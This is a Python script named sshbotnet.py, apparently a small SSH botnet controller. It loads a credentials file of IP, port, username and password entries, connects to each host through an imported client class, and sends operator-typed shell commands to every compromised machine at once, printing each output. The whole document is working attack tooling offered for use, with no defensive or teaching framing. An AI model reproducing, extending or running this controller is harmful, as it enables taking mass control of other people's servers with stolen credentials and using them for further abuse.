#!/usr/bin/env python3
from client import Client
from threading import Thread
import sys

botnet = []
threads  = []

def sendBotnetCmd(cmd):
    for bot in botnet:
        out = bot.sendCmd(cmd)
        if out == -1:
            return
        out = out.decode()
        print(f"[*] Output for {bot.username}@{bot.ip}:")
        print(f'[+] {out}')
        print('-'* 100)
        

def addClient(ip, port, username, password):
    client = Client(ip, port, username, password)
    botnet.append(client)

def createBotnet(file):
    try:
        with open(file, 'r') as f:
            for line in f:
                (ip, port, username, password) = line.split(':')
                t = Thread(target=addClient, args=(ip, port, username, password))
                t.start()
                threads.append(t)
    except Exception as e:
        pass

def cleanThreads():
    while threads:
        for t in threads:
            if not t.is_alive():
                threads.remove(t)

def main():
   if len(sys.argv) != 2:
       print('[-] Usage: sshbotnet.py botnet_creds.txt')
       exit(1)
   createBotnet(sys.argv[1])
   
   while True:
    cleanThreads()
    if not threads:
        cmd = input('\033[1;36mcmd>\033[00m ')

        if cmd == 'exit()' or cmd == 'exit' or cmd == 'quit':
            break
        else:
            sendBotnetCmd(cmd)

if __name__ == '__main__':
    main()